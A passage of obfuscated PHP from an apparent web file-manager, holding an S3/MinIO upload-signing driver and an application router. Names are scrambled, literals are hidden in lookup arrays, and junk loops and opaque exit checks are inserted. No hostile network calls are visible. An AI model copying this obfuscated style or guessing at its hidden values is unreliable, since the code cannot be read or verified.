gmdate($çØ‡êÃ¯[262]); $î‘Æóã² = $çØ‡êÃ¯[263]; $•Ë™àà° = $ãèñˆç . $çØ‡êÃ¯[12]; $À½‰ÒÙç = $çØ‡êÃ¯[264]; $‡£ÜĞŒŸ = array($this->accessKey, $„‚Ï‰ëä, $this->region, $èÀ‚™í¼, $î‘Æóã²); $ëøÜÛË = implode($çØ‡êÃ¯[8], $‡£ÜĞŒŸ); $å™õ¹œ† = array($çØ‡êÃ¯[265] => gmdate($çØ‡êÃ¯[266], strtotime($çØ‡êÃ¯[267])), $çØ‡êÃ¯[268] => array(array($çØ‡êÃ¯[269] => $this->bucket), array($çØ‡êÃ¯[270], $çØ‡êÃ¯[271], $çØ‡êÃ¯[12]), array($çØ‡êÃ¯[270], $çØ‡êÃ¯[272], $çØ‡êÃ¯[12]), array($çØ‡êÃ¯[273] => $À½‰ÒÙç), array($çØ‡êÃ¯[274] => $ëøÜÛË), array($çØ‡êÃ¯[275] => $îÔ¼ßŞõ), array($çØ‡êÃ¯[276] => $·–®à¾Ë), array($çØ‡êÃ¯[277] => $•Ë™àà°))); $‚‚í™¹ö = base64_encode(json_encode($å™õ¹œ†)); $Ò—Íòèã = hash_hmac($çØ‡êÃ¯[278], $„‚Ï‰ëä, $çØ‡êÃ¯[279] . $this->secret, !0); $½Ä¢Î¨˜ = hash_hmac($çØ‡êÃ¯[278], $this->region, $Ò—Íòèã, !0); $«¨äÕşö = hash_hmac($çØ‡êÃ¯[278], $èÀ‚™í¼, $½Ä¢Î¨˜, !0); $É¤ğæŞç = hash_hmac($çØ‡êÃ¯[278], $î‘Æóã², $«¨äÕşö, !0); $àâ§ û¯ = hash_hmac($çØ‡êÃ¯[278], $‚‚í™¹ö, $É¤ğæŞç); $±ÍÙèı¶ = array($çØ‡êÃ¯[249] => $çØ‡êÃ¯[12], $çØ‡êÃ¯[273] => $À½‰ÒÙç, $çØ‡êÃ¯[280] => $‚‚í™¹ö, $çØ‡êÃ¯[274] => $ëøÜÛË, $çØ‡êÃ¯[275] => $îÔ¼ßŞõ, $çØ‡êÃ¯[276] => $·–®à¾Ë, $çØ‡êÃ¯[277] => $•Ë™àà°, $çØ‡êÃ¯[281] => $àâ§ û¯, $çØ‡êÃ¯[259] => $çØ‡êÃ¯[250], $çØ‡êÃ¯[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($±ÍÙèı¶[$çØ‡êÃ¯[259]]); } return $±ÍÙèı¶; } public function uploadMultiData($—ƒÑêòÜ, $Ï›¼è˜¤ = 3600) { $Ï‡ƒç‡ =& $_SERVER[¼¥ÊĞÙÌ]; $óÒñÒ±ø = $this->signVer == $Ï‡ƒç‡[250] ? gmdate($Ï‡ƒç‡[282]) : gmdate($Ï‡ƒç‡[283]); $Ùá´õãÃ = array(); $“¢ÒîÇ = $this->client->getUploadId($this->bucket, $—ƒÑêòÜ, $Ùá´õãÃ); if (!$“¢ÒîÇ) { return !1; } $ÇÕ»¸Î = array($Ï‡ƒç‡[284] => $“¢ÒîÇ, $Ï‡ƒç‡[209] => $this->getHost() . $Ï‡ƒç‡[8] . $this->pathEncode($—ƒÑêòÜ), $Ï‡ƒç‡[285] => $óÒñÒ±ø, $Ï‡ƒç‡[97] => $—ƒÑêòÜ, $Ï‡ƒç‡[259] => $this->signVer); if ($this->_isClientAsync()) { unset($ÇÕ»¸Î[$Ï‡ƒç‡[259]]); } return $ÇÕ»¸Î; } public function uploadMultiAuth($İŸ¼ÕèÙ, $ÅĞªÆçğ = array()) { $Ú’±ÙÀê =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->signVer == $Ú’±ÙÀê[250]) { if (isset($ÅĞªÆçğ[$Ú’±ÙÀê[286]])) { return $this->uploadPartAuthV2($İŸ¼ÕèÙ, $ÅĞªÆçğ); } return $this->uploadListAuthV2($İŸ¼ÕèÙ, $ÅĞªÆçğ); } if (isset($ÅĞªÆçğ[$Ú’±ÙÀê[286]])) { return $this->uploadPartAuthV4($İŸ¼ÕèÙ, $ÅĞªÆçğ); } return $this->uploadListAuthV4($İŸ¼ÕèÙ, $ÅĞªÆçğ); } public function uploadPartAuthV2($Ã‰Ã ëŠ, $ü¨íƒ° = array()) { $ºÄ–èÄä =& $_SERVER[¼¥ÊĞÙÌ]; $üşûÔ¸Û = $ü¨íƒ°[$ºÄ–èÄä[97]]; $ıÇÀÄ†’ = gmdate($ºÄ–èÄä[282]); $Œ”©–„µ = array_intersect_key($ü¨íƒ°, array_flip(array($ºÄ–èÄä[286], $ºÄ–èÄä[284]))); ksort($Œ”©–„µ); $Äòİ‘† = $Œ”©–„µ ? $ºÄ–èÄä[76] . http_build_query($Œ”©–„µ, null, $ºÄ–èÄä[287], PHP_QUERY_RFC3986) : $ºÄ–èÄä[12]; $‹á²Ú…Ï = array($ºÄ–èÄä[256], $ºÄ–èÄä[12], $ºÄ–èÄä[123], $ºÄ–èÄä[12], "\x78\x2d\x61\x6d\x7a\x2d\144\x61\164\145\72{$ıÇÀÄ†’}", $ºÄ–èÄä[8] . $this->bucket . $ºÄ–èÄä[8] . $this->pathEncode($üşûÔ¸Û) . $Äòİ‘†); $æ˜ÁºòÏ = implode($ºÄ–èÄä[288], $‹á²Ú…Ï); $øÆ†¹Ï° = $this->client->__getSignature($æ˜ÁºòÏ); return array($ºÄ–èÄä[289] => $øÆ†¹Ï°, $ºÄ–èÄä[285] => $ıÇÀÄ†’); } public function uploadListAuthV2($öüó®Åø, $ÃùĞ†öó = array()) { $ê¬”Ìå =& $_SERVER[¼¥ÊĞÙÌ]; $ŸˆÙùÁ· = $ÃùĞ†öó[$ê¬”Ìå[97]]; $šÜÌŞÖ´ = $ÃùĞ†öó[$ê¬”Ìå[284]]; $ÖÙÀ¶’ = $this->client->listParts($this->bucket, $ŸˆÙùÁ·, $šÜÌŞÖ´); if (!$ÖÙÀ¶’) { return !1; } $úÏÅî¥– = gmdate($ê¬”Ìå[282]); $—Õé«Æ¬ = $ê¬”Ìå[290] . $šÜÌŞÖ´; $ğƒ”ãÄô = array($ê¬”Ìå[291], $ê¬”Ìå[12], $ê¬”Ìå[123], $ê¬”Ìå[12], "\170\x2d\141\155\x7a\x2d\x64\141\164\145\72{$úÏÅî¥–}", $ê¬”Ìå[8] . $this->bucket . $ê¬”Ìå[8] . $this->pathEncode($ŸˆÙùÁ·) . $—Õé«Æ¬); $÷ÀÖ›â£ = implode($ê¬”Ìå[288], $ğƒ”ãÄô); $ô‘ÎôĞ = $this->client->__getSignature($÷ÀÖ›â£); return array($ê¬”Ìå[289] => $ô‘ÎôĞ, $ê¬”Ìå[285] => $úÏÅî¥–, $ê¬”Ìå[292] => $ÖÙÀ¶’); } public function uploadPartAuthV4($«Øğ›¸¹, $­ÇùÆ²Ê = array()) { $Ÿ‘¥Í‚² =& $_SERVER[¼¥ÊĞÙÌ]; $÷İû‰ò = $­ÇùÆ²Ê[$Ÿ‘¥Í‚²[97]]; $„İ­¨áÓ = array($Ÿ‘¥Í‚²[276] => gmdate($Ÿ‘¥Í‚²[283]), $Ÿ‘¥Í‚²[293] => _get($­ÇùÆ²Ê, $Ÿ‘¥Í‚²[294], hash($Ÿ‘¥Í‚²[278], $Ÿ‘¥Í‚²[12]))); $·ºäıØÚ = explode($Ÿ‘¥Í‚²[211], $this->getHost()); $‰ËÀ¼ÏÑ = array($Ÿ‘¥Í‚²[295] => $·ºäıØÚ[1], $Ÿ‘¥Í‚²[296] => $Ÿ‘¥Í‚²[12], $Ÿ‘¥Í‚²[249] => $Ÿ‘¥Í‚²[123], $Ÿ‘¥Í‚²[297] => $­ÇùÆ²Ê[$Ÿ‘¥Í‚²[79]]); $¹Ê¥­ÊĞ = $Ÿ‘¥Í‚²[256]; $ÈÃ®™ÌÎ = $Ÿ‘¥Í‚²[8] . $this->pathEncode($÷İû‰ò); $ßÈ‹øÏ¥ = array_intersect_key($­ÇùÆ²Ê, array_flip(array($Ÿ‘¥Í‚²[286], $Ÿ‘¥Í‚²[284]))); $çàä = $this->client->__getSignatureV4($„İ­¨áÓ, $‰ËÀ¼ÏÑ, $¹Ê¥­ÊĞ, $ÈÃ®™ÌÎ, $ßÈ‹øÏ¥); return array($Ÿ‘¥Í‚²[289] => $çàä, $Ÿ‘¥Í‚²[293] => $„İ­¨áÓ[$Ÿ‘¥Í‚²[293]], $Ÿ‘¥Í‚²[285] => $„İ­¨áÓ[$Ÿ‘¥Í‚²[276]]); } public function uploadListAuthV4($Äß’ú´ß, $öî¿ïÎ = array()) { $êÕÑøèà =& $_SERVER[¼¥ÊĞÙÌ]; $õÀ‚¾Ù = $öî¿ïÎ[$êÕÑøèà[97]]; $ú•ï…øó = $öî¿ïÎ[$êÕÑøèà[284]]; $êªèÜğ” = $this->client->listParts($this->bucket, $õÀ‚¾Ù, $ú•ï…øó); if (!$êªèÜğ”) { return !1; } $ôÛ¾­ËË = $êÕÑøèà[298]; foreach ($êªèÜğ” as $¶»ôÛ›) { $ôÛ¾­ËË .= $êÕÑøèà[299] . "\74\120\141\x72\164\116\165\x6d\x62\145\162\76{$¶»ôÛ›[$êÕÑøèà[300]]}\x3c\x2f\x50\x61\162\164\116\x75\x6d\x62\145\162\x3e\xa" . "\74\x45\124\x61\x67\x3e{$¶»ôÛ›[$êÕÑøèà[301]]}\74\57\x45\x54\x61\x67\76\12" . $êÕÑøèà[302]; } $ôÛ¾­ËË .= $êÕÑøèà[303]; $éİ¬®æÔ = array($êÕÑøèà[276] => gmdate($êÕÑøèà[283]), $êÕÑøèà[293] => hash($êÕÑøèà[278], $ôÛ¾­ËË)); $éóùğä = explode($êÕÑøèà[211], $this->getHost()); $Èœââë = array($êÕÑøèà[295] => $éóùğä[1], $êÕÑøèà[249] => $êÕÑøèà[123], $êÕÑøèà[297] => strlen($ôÛ¾­ËË)); $«íÚí‰Ö = $êÕÑøèà[291]; $É ¶²à = $êÕÑøèà[8] . $this->pathEncode($õÀ‚¾Ù); $ªŸœ´¾ = array($êÕÑøèà[284] => $ú•ï…øó); $ªŠ©’ÁŸ = $this->client->__getSignatureV4($éİ¬®æÔ, $Èœââë, $«íÚí‰Ö, $É ¶²à, $ªŸœ´¾); return array($êÕÑøèà[289] => $ªŠ©’ÁŸ, $êÕÑøèà[293] => $éİ¬®æÔ[$êÕÑøèà[293]], $êÕÑøèà[285] => $éİ¬®æÔ[$êÕÑøèà[276]], $êÕÑøèà[292] => $êªèÜğ”); } private function _isClientAsync() { $îÄçŠ®ì =& $_SERVER[¼¥ÊĞÙÌ]; static $òî…Íù× = null; if ($òî…Íù× === null) { $”œ¼İ¬ı = isset($_REQUEST[$îÄçŠ®ì[304]]) ? json_decode($_REQUEST[$îÄçŠ®ì[304]], !0) : !1; $òî…Íù× = $”œ¼İ¬ı && _get($”œ¼İ¬ı, $îÄçŠ®ì[305]) == $îÄçŠ®ì[306]; } return $òî…Íù×; } public function getHost() { $ÈäÈŸøº =& $_SERVER[¼¥ÊĞÙÌ]; $ÚŞ»©¾” = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÈäÈŸøº[70], $ÈäÈŸøº[64], $ÈäÈŸøº[69], $ÈäÈŸøº[62]))) { return $ÚŞ»©¾” . $ÈäÈŸøº[8] . $this->bucket; } if ($this->osType == $ÈäÈŸøº[62] && !is_domain($ÚŞ»©¾”)) { return $ÚŞ»©¾” . $ÈäÈŸøº[8] . $this->bucket; } $ÚŞ»©¾” = explode($ÈäÈŸøº[211], $ÚŞ»©¾”); return $ÚŞ»©¾”[0] . $ÈäÈŸøº[211] . $this->bucket . $ÈäÈŸøº[10] . $ÚŞ»©¾”[1]; } public function size($Ó²»€Ğ) { $˜öÒÒÑ = $this->objectMeta($Ó²»€Ğ); return $˜öÒÒÑ ? $˜öÒÒÑ[$_SERVER[¼¥ÊĞÙÌ][79]] : 0; } public function info($ÉÀäöÏû) { if ($this->isFolder($ÉÀäöÏû)) { return $this->folderInfo($ÉÀäöÏû); } else { if ($this->isFile($ÉÀäöÏû)) { return $this->fileInfo($ÉÀäöÏû); } } return !1; } public function exist($òæ»ì÷•) { return $this->isFile($òæ»ì÷•) || $this->isFolder($òæ»ì÷•); } public function isFile($‘ÜÕŞ×Ø) { return !$this->isFolder($‘ÜÕŞ×Ø) && $this->objectMeta($‘ÜÕŞ×Ø); } public function isFolder($ÒÏ¼¸¿) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][180], $ÒÏ¼¸¿); } protected function objectMeta($¢ÏŒë©–) { return $this->cacheMethod($_SERVER[¼¥ÊĞÙÌ][182], $¢ÏŒë©–); } protected function _objectMeta($±Õï¶Âõ) { $©¡ß“Ø =& $_SERVER[¼¥ÊĞÙÌ]; $±Õï¶Âõ = rtrim($±Õï¶Âõ, $©¡ß“Ø[8]); try { $à™•»³• = $this->client->getObjectInfo($this->bucket, $±Õï¶Âõ); if (!isset($à™•»³•[$©¡ß“Ø[255]]) && isset($à™•»³•[$©¡ß“Ø[307]])) { $à™•»³•[$©¡ß“Ø[255]] = $à™•»³•[$©¡ß“Ø[307]]; } } catch (Exception $…İ§Õàª) { $à™•»³• = !1; } if (!$à™•»³•) { } return $à™•»³•; } protected function _isFolder($š†à•„) { $Í‘Ñã›Ò =& $_SERVER[¼¥ÊĞÙÌ]; $š†à•„ = rtrim($š†à•„, $Í‘Ñã›Ò[8]) . $Í‘Ñã›Ò[8]; if ($š†à•„ == $Í‘Ñã›Ò[12] || $š†à•„ == $Í‘Ñã›Ò[8]) { return !0; } $Ë¡¾¬¼Œ = $this->client->getBucket($this->bucket, $š†à•„, null, 1); if (empty($Ë¡¾¬¼Œ[$Í‘Ñã›Ò[239]])) { return !1; } $§À‰¾—â = $Ë¡¾¬¼Œ[$Í‘Ñã›Ò[239]][0][$Í‘Ñã›Ò[32]]; return stripos($§À‰¾—â, $š†à•„) === 0 ? !0 : !1; if (substr($§À‰¾—â, -1) == $Í‘Ñã›Ò[8]) { return !0; } if (get_path_this($§À‰¾—â) == get_path_this($š†à•„)) { return !1; } return !0; } public function listObject($¶µˆŸüÜ) { return $this->fileList($¶µˆŸüÜ, $_SERVER[¼¥ÊĞÙÌ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Ùœë¹ÃŞ) { $çş†¸ìô =& $_SERVER[¼¥ÊĞÙÌ]; parent::__construct($Ùœë¹ÃŞ); $this->setSignVersion($çş†¸ìô[250]); if (!$this->region) { $this->region = $çş†¸ìô[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $¾·²×ëØ = $this->getBktRegion(); return $this->region == $¾·²×ëØ ? !0 : !1; } public function uploadFormData($Ú«‘şñ±, $×Û¢ù­ˆ = 3600) { $’´¶Õş‡ =& $_SERVER[¼¥ÊĞÙÌ]; $ßìÔÂ‰ = $’´¶Õş‡[232]; $Î‰  ş‹ = $’´¶Õş‡[260]; $¶Ø¬êÄ† = $’´¶Õş‡[62]; $…‰…«îÖ = gmdate($’´¶Õş‡[261]); $äíå®È„ = gmdate($’´¶Õş‡[262]); $Ç­ğÈ¸Ó = $’´¶Õş‡[263]; $Á•Ş” = $×Û¢ù­ˆ . $’´¶Õş‡[12]; $‚“¨®‘ã = $’´¶Õş‡[264]; $Œçì¢› = array($this->accessKey, $äíå®È„, $this->region, $¶Ø¬êÄ†, $Ç­ğÈ¸Ó); $Òû¹Ï¥ = implode($’´¶Õş‡[8], $Œçì¢›); $À´’Ëº = array($’´¶Õş‡[265] => gmdate($’´¶Õş‡[266], strtotime($’´¶Õş‡[267])), $’´¶Õş‡[268] => array(array($’´¶Õş‡[269] => $this->bucket), array($’´¶Õş‡[309] => $ßìÔÂ‰), array($’´¶Õş‡[270], $’´¶Õş‡[271], $’´¶Õş‡[12]), array($’´¶Õş‡[270], $’´¶Õş‡[272], $’´¶Õş‡[12]), array($’´¶Õş‡[270], $’´¶Õş‡[310], $’´¶Õş‡[12]), array($’´¶Õş‡[273] => $‚“¨®‘ã), array($’´¶Õş‡[274] => $Òû¹Ï¥), array($’´¶Õş‡[275] => $Î‰  ş‹), array($’´¶Õş‡[276] => $…‰…«îÖ), array($’´¶Õş‡[277] => $Á•Ş”))); $¾Ò¨›éÊ = base64_encode(json_encode($À´’Ëº)); $œÅÄ€òÀ = hash_hmac($’´¶Õş‡[278], $äíå®È„, $’´¶Õş‡[279] . $this->secret, !0); $£š¼ïÕê = hash_hmac($’´¶Õş‡[278], $this->region, $œÅÄ€òÀ, !0); $ˆÆ†³©Ú = hash_hmac($’´¶Õş‡[278], $¶Ø¬êÄ†, $£š¼ïÕê, !0); $ ¸µˆ¼ó = hash_hmac($’´¶Õş‡[278], $Ç­ğÈ¸Ó, $ˆÆ†³©Ú, !0); $î°ıËÄ™ = hash_hmac($’´¶Õş‡[278], $¾Ò¨›éÊ, $ ¸µˆ¼ó); $å÷ó‡ü­ = array($’´¶Õş‡[249] => $’´¶Õş‡[12], $’´¶Õş‡[297] => $’´¶Õş‡[12], $’´¶Õş‡[309] => $ßìÔÂ‰, $’´¶Õş‡[273] => $‚“¨®‘ã, $’´¶Õş‡[280] => $¾Ò¨›éÊ, $’´¶Õş‡[311] => $Òû¹Ï¥, $’´¶Õş‡[312] => $Î‰  ş‹, $’´¶Õş‡[313] => $…‰…«îÖ, $’´¶Õş‡[314] => $Á•Ş”, $’´¶Õş‡[315] => $î°ıËÄ™, $’´¶Õş‡[209] => $this->getHost()); return $å÷ó‡ü­; } } goto bëñ¼ë…¾¯; bÅÁèøãğİ: if (!$twnzdyvrmc) { die; } class Application { private $defaultModule = "\x69\x6e\144\145\170"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\x69\156\x64\x65\170"; function __construct() { } public function setDefault($æ¹òæÛê) { $Ã‚ÔôÒ¸ =& $_SERVER[¼¥ÊĞÙÌ]; $²å”É„Ù =& $_SERVER[ƒ›ÍÚğ]; $–—§§ùô = explode($²å”É„Ù[0], trim($æ¹òæÛê, $²å”É„Ù[0])); $×Ïß­†» = $Ã‚ÔôÒ¸[692]; while ($×Ïß­†» < $Ã‚ÔôÒ¸[693]) { if ($×Ïß­†» >= 0) { break; } $×Ïß­†»++; } $this->defaultModule = $–—§§ùô[0] ? $–—§§ùô[0] : $this->defaultModule; $¯‹ò“İ = $Ã‚ÔôÒ¸[694]; if (strlen($¯‹ò“İ) < $Ã‚ÔôÒ¸[695]) { die; } $this->defaultController = $–—§§ùô[1] ? $–—§§ùô[1] : $this->defaultController; $this->defaultAction = $–—§§ùô[2] ? $–—§§ùô[2] : $this->defaultAction; $this->ture2b8a24cb($²å”É„Ù[1], array($this, $²å”É„Ù[2])); } public function appRun($û¶ü£Ô‡) { $¸ûÔ Ú =& $_SERVER[¼¥ÊĞÙÌ]; $ÕŞä‘”¨ =& $_SERVER[ƒ›ÍÚğ]; $¸ØÓ­ú¸ = explode($ÕŞä‘”¨[0], $û¶ü£Ô‡); $Øò² ¶ = strtolower($¸ØÓ­ú¸[0]); $£—İŠ–ü = $¸ûÔ Ú[696]; if (strlen($£—İŠ–ü) < $¸ûÔ Ú[697]) { return; } $Š¢Õá×ù = $ÕŞä‘”¨[3]; $´ØÛø = $¸ûÔ Ú[698]; while (strlen($´ØÛø) < $¸ûÔ Ú[688]) { if (!$´ØÛø) { break; } $´ØÛø++; } if ($Øò² ¶ == $ÕŞä‘”¨[4]) { $Š¢Õá×ù = $ÕŞä‘”¨[5]; $¸ØÓ­ú¸[0] = $ÕŞä‘”¨[6]; $¸ØÓ­ú¸[1] = $¸ØÓ­ú¸[1] . $ÕŞä‘”¨[7]; $û¶ü£Ô‡ = join($ÕŞä‘”¨[0], $¸ØÓ­ú¸); $û¶ü£Ô‡ = trim($û¶ü£Ô‡, $ÕŞä‘”¨[0]); } call_user_func(array($ÕŞä‘”¨[8], $ÕŞä‘”¨[9]), $Š¢Õá×ù . $ÕŞä‘”¨[10], $û¶ü£Ô‡); ActionCall($û¶ü£Ô‡); call_user_func(array($ÕŞä‘”¨[8], $ÕŞä‘”¨[9]), $Š¢Õá×ù . $ÕŞä‘”¨[11], $û¶ü£Ô‡); } private function autorun() { $‡ÚÒôäì =& $_SERVER[¼¥ÊĞÙÌ]; $Şµ½ç’œ =& $_SERVER[ƒ›ÍÚğ]; global $config; if (count($config[$Şµ½ç’œ[12]]) == 0) { return; } foreach ($config[$Şµ½ç’œ[12]] as $‡¥šàƒ => $û¤£»çÔ) { $this->appRun($û¤£»çÔ); $×Äöã—Å = $‡ÚÒôäì[699]; if (strlen($×Äöã—Å) < $‡ÚÒôäì[697]) { die; } } } private function ngcz70469827() { $×Á©û± =& $_SERVER[¼¥ÊĞÙÌ]; $ËˆÜÂ³Ô =& $_SERVER[ƒ›ÍÚğ]; $°”ê‘äö = $ËˆÜÂ³Ô[4]; $«Å…¥ƒ¼ = $GLOBALS[$ËˆÜÂ³Ô[13]][$ËˆÜÂ³Ô[14]][0]; if (!$«Å…¥ƒ¼ || strlen($«Å…¥ƒ¼) <= strlen($°”ê‘äö)) { return; } if (strtolower(substr($«Å…¥ƒ¼, -strlen($°”ê‘äö))) != $°”ê‘äö) { return; } $¼…Óá— = substr($«Å…¥ƒ¼, 0, -strlen($°”ê‘äö)); $í¦ãå®ì = array($ËˆÜÂ³Ô[4], $¼…Óá—); $±‹“™ÚÆ = $×Á©û±[700]; $¸”°×è­ = array_slice($GLOBALS[$ËˆÜÂ³Ô[13]][$ËˆÜÂ³Ô[14]], 1); $GLOBALS[$ËˆÜÂ³Ô[13]][$ËˆÜÂ³Ô[14]] = array_merge($í¦ãå®ì, $¸”°×è­); $‹š›ã» = $×Á©û±[701]; if (!$‹š›ã») { return; } $GLOBALS[$ËˆÜÂ³Ô[13]][$ËˆÜÂ³Ô[15]] = implode($ËˆÜÂ³Ô[0], $GLOBALS[$ËˆÜÂ³Ô[13]][$ËˆÜÂ³Ô[14]]); $êÜÕ¼Â™ = $×Á©û±[702]; while (strlen($êÜÕ¼Â™) < $×Á©û±[695]) { if (!$êÜÕ¼Â™) { break; } $êÜÕ¼Â™++; } } private function pvqnfd5b421c() { $ŞÓ¿ï÷ï =& $_SERVER[ƒ›ÍÚğ]; if ($GLOBALS[$ŞÓ¿ï÷ï[13]][$ŞÓ¿ï÷ï[15]] != $ŞÓ¿ï÷ï[6]) { return; } $ÚÀ“¡¹ = $_SERVER[$ŞÓ¿ï÷ï[16]]; $¤ûòØòç = $_SERVER[¼¥ÊĞÙÌ][703]; $Ë‰„€äâ = $ŞÓ¿ï÷ï[17]; if (!strstr($ÚÀ“¡¹, $Ë‰„€äâ)) { return; } $Ôó¢Øğç = strrpos($ÚÀ“¡¹, $Ë‰„€äâ); $¢´­§Ñù = substr($ÚÀ“¡¹, $Ôó¢Øğç + strlen($Ë‰„€äâ)); preg_match_all($ŞÓ¿ï÷ï[18], $¢´­§Ñù, $¹ùŸ¢éË); $¢´­§Ñù = trim($¹ùŸ¢éË[0][0], $ŞÓ¿ï÷ï[19]); $GLOBALS[$ŞÓ¿ï÷ï[13]][$ŞÓ¿ï÷ï[14]] = explode($ŞÓ¿ï÷ï[19], $¢´­§Ñù); $GLOBALS[$ŞÓ¿ï÷ï[13]][$ŞÓ¿ï÷ï[15]] = implode($ŞÓ¿ï÷ï[0], $GLOBALS[$ŞÓ¿ï÷ï[13]][$ŞÓ¿ï÷ï[14]]); } public function run() { $úØÖš =& $_SERVER[¼¥ÊĞÙÌ]; $ÑöôùñŠ =& $_SERVER[ƒ›ÍÚğ]; $this->pvqnfd5b421c(); $–ïÓì¥¹ = $úØÖš[704]; while (strlen($–ïÓì¥¹) < $úØÖš[695]) { if (!$–ïÓì¥¹) { break; } $–ïÓì¥¹++; } $this->ngcz70469827(); $‘‹³¿“ê = $úØÖš[705]; if (!$‘‹³¿“ê) { die; } $õ«¯¤¯æ = $GLOBALS[$ÑöôùñŠ[13]][$ÑöôùñŠ[14]]; $ë–­Ùóª = $úØÖš[706]; $îæØìÎÍ = $GLOBALS[$ÑöôùñŠ[13]][$ÑöôùñŠ[15]]; define($ÑöôùñŠ[20], isset($õ«¯¤¯æ[0]) && $õ«¯¤¯æ[0] ? $õ«¯¤¯æ[0] : $this->defaultModule); define($ÑöôùñŠ[21], isset($õ«¯¤¯æ[1]) && $õ«¯¤¯æ[0] ? $õ«¯¤¯æ[1] : $this->defaultController); $®©¿¦¢” = $úØÖš[707]; if (strlen($®©¿¦¢”) < $úØÖš[688]) { die; } define($ÑöôùñŠ[22], isset($õ«¯¤¯æ[2]) && $õ«¯¤¯æ[0] ? $õ«¯¤¯æ[2] : $this->defaultAction); define($ÑöôùñŠ[23], MOD . $ÑöôùñŠ[0] . ST . $ÑöôùñŠ[0] . ACT); $_SERVER[$ÑöôùñŠ[24]] = strtolower(ACTION); $õÉã®“Ô = $úØÖš[708]; if (!$õÉã®“Ô) { die; } $this->autorun(); if (count($õ«¯¤¯æ) >= 3) { $this->appRun($îæØìÎÍ); } else { $this->appRun(ACTION); } } private $rnyf5ff11d07 = array(); private $pvfs46919b72 = ''; public function xgfsb0b04972() { $ü²µ¶úÎ =& $_SERVER[¼¥ÊĞÙÌ]; $Ğô¶ì•ª =& $_SERVER[ƒ›ÍÚğ]; $this->crsg3cfc2cc6(); $this->ovxr28bf0256(); $øÃ¬¹ŸØ = $ü²µ¶úÎ[709]; if (!$øÃ¬¹ŸØ) { return; } $this->fcmedc5eb81c(); $this->wkbm0807825c(); $this->rkfl82122937(); $this->hkfm97fc2cee(); $this->bdwzbb5a15b2(); $æ‚ÉÍíú = $ü²µ¶úÎ[710]; $this->ture2b8a24cb($Ğô¶ì•ª[25], array($this, $Ğô¶ì•ª[26])); $this->ture2b8a24cb($Ğô¶ì•ª[27], array($this, $Ğô¶ì•ª[28])); $Õæ€†šÂ = $ü²µ¶úÎ[711]; while ($Õæ€†šÂ < $ü²µ¶úÎ[688]) { if ($Õæ€†šÂ >= 0) { break; } $Õæ€†šÂ++; } $this->ture2b8a24cb($Ğô¶ì•ª[29], array($this, $Ğô¶ì•ª[30])); $àîÂ¤ÉŞ = $ü²µ¶úÎ[712]; while (strlen($àîÂ¤ÉŞ) < $ü²µ¶úÎ[693]) { if (!$àîÂ¤ÉŞ) { break; } $àîÂ¤ÉŞ++; } $this->ture2b8a24cb($Ğô¶ì•ª[31], array($this, $Ğô¶ì•ª[32])); } public function ecxsa06c1959($Æô¯ù“) { $õ¬ïù»Ğ =& $_SERVER[¼¥ÊĞÙÌ]; $ò ‰¨åå =& $_SERVER[ƒ›ÍÚğ]; $ûÈ‚ºîØ = Model($ò ‰¨åå[33])->get(); $ßÔ‰ìô = $õ¬ïù»Ğ[713]; if (strlen($ßÔ‰ìô) < $õ¬ïù»Ğ[695]) { die; } $Æšàê›ã = array($ò ‰¨åå[34], $ò ‰¨åå[35], $ò ‰¨åå[36], $ò ‰¨åå[37], $ò ‰¨åå[38], $ò ‰¨åå[39], $ò ‰¨åå[40], $ò ‰¨åå[41], $ò ‰¨åå[42], $ò ‰¨åå[43], $ò ‰¨åå[44], $ò ‰¨åå[45], $ò ‰¨åå[46], $ò ‰¨åå[47], $ò ‰¨åå[48], $ò ‰¨åå[49], $ò ‰¨åå[50], $ò ‰¨åå[51], $ò ‰¨åå[52], $ò ‰¨åå[53], $ò ‰¨åå[54], $ò ‰¨åå[55], $ò ‰¨åå[56], $ò ‰¨åå[57], $ò ‰¨åå[58], $ò ‰¨åå[59], $ò ‰¨åå[60], $ò ‰¨åå[61], $ò ‰¨åå[62], $ò ‰¨åå[63], $ò ‰¨åå[64], $ò ‰¨åå[65], $ò ‰¨åå[66], $ò ‰¨åå[67], $ò ‰¨åå[68], $ò ‰¨åå[69], $ò ‰¨åå[70], $ò ‰¨åå[71], $ò ‰¨åå[72], $ò ‰¨åå[73], $ò ‰¨åå[74], $ò ‰¨åå[75], $ò ‰¨åå[76], $ò ‰¨åå[77], $ò ‰¨åå[78], $ò ‰¨åå[79], $ò ‰¨åå[80], $ò ‰¨åå[81], $ò ‰¨åå[82], $ò ‰¨åå[83], $ò ‰¨åå[84], $ò ‰¨åå[85]); foreach ($Æšàê›ã as $Î˜Ãà³ó) { $ÁÉªİ›„ = $GLOBALS[$ò ‰¨åå[86]][$ò ‰¨åå[87]][$Î˜Ãà³ó]; if (isset($ûÈ‚ºîØ[$Î˜Ãà³ó])) { $ÁÉªİ›„ = $ûÈ‚ºîØ[$Î˜Ãà³ó]; } $Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[89]][$Î˜Ãà³ó] = $ÁÉªİ›„; } $¡­‘Ö½ = $Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[89]][$ò ‰¨åå[46]]; $•­Áì à = $õ¬ïù»Ğ[714]; unset($Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[90]][$ò ‰¨åå[91]]); unset($Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[90]][$ò ‰¨åå[92]]); unset($Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[89]][$ò ‰¨åå[46]]); unset($Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[89]][$ò ‰¨åå[93]]); $Æô¯ù“[$ò ‰¨åå[88]][$ò ‰¨åå[89]][$ò ‰¨åå[94]] = array($ò ‰¨åå[95] => (int) $¡­‘Ö½[$ò ‰¨åå[96]], $ò ‰¨åå[97] => (int) _get($¡­‘Ö½, $ò ‰¨åå[98], 0)); $¿ç¶Êí = substr(md5($ò ‰¨åå[99] . get_client_ip() . $ûÈ‚ºîØ[$ò ‰¨åå[100]]), 0, 15); 